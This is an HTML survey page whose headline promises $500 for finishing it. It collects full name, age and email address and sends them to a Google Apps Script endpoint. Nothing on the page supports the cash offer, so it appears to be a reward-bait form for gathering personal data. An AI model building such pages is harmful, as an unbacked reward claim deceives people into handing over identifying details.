<!DOCTYPE html>
<html>
<head>
  <title>Survey</title>
  <style>
    /* Reset some default styles */
    body {
      font-family: Arial, sans-serif;
      background: #f4f7f8;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
    }

    form {
      background: white;
      padding: 20px 30px;
      border-radius: 8px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }

    h1 {
      text-align: center;
      color: #333;
      margin-bottom: 24px;
      font-weight: 600;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: #555;
      font-weight: 500;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px 12px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 15px;
      transition: border-color 0.3s ease;
    }

    input[type="text"]:focus {
      border-color: #3f51b5;
      outline: none;
      box-shadow: 0 0 5px rgba(63,81,181,0.5);
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #3f51b5;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: 600;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #303f9f;
    }

    #response {
      margin-top: 20px;
      text-align: center;
      font-weight: 600;
      color: green;
      min-height: 1.2em;
    }

    /* Responsive tweaks */
    @media (max-width: 600px) {
      body {
        padding: 10px;
      }

      form {
        padding: 15px 20px;
      }
    }
  </style>
</head>
<body>
  <form id="survey-form">
    <h1>üí∏Complete This Survey and Receive $500!üí∏</h1>

    <label for="q1">Full Name:</label>
    <input type="text" id="q1" name="q1" required>

    <label for="q2">Age:</label>
    <input type="text" id="q2" name="q2" required>

    <label for="q3">Email Address:</label>
    <input type="text" id="q3" name="q3" required>

    <label for="q4">What are your goals in life?</label>
    <input type="text" id="q4" name="q4" required>

    <label for="q5">What would you do with $500?</label>
    <input type="text" id="q5" name="q5" required>

    <label for="q6">What is your favorite animal?</label>
    <input type="text" id="q6" name="q6" required>

    <button type="submit">Submit</button>

    <p id="response"></p>
  </form>

  <script>
    const form = document.getElementById('survey-form');
    const responseEl = document.getElementById('response');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const formData = new FormData(form);

      fetch('https://script.google.com/macros/s/AKfycbw3gTxb7EXFZQlfnHgKIBfQXtDNNl9Av95x4hfmCzfwdPLzqOGboyOyx6SOTzr2FWD1/exec', {
        method: 'POST',
        body: formData
      })
      .then(response => response.text())
      .then(text => {
        responseEl.textContent = "‚úÖ Successfully submitted!";
        form.reset();
      })
      .catch(error => {
        responseEl.textContent = "‚ùå Error submitting the form.";
        console.error(error);
      });
    });
  </script>
</body>
</html>
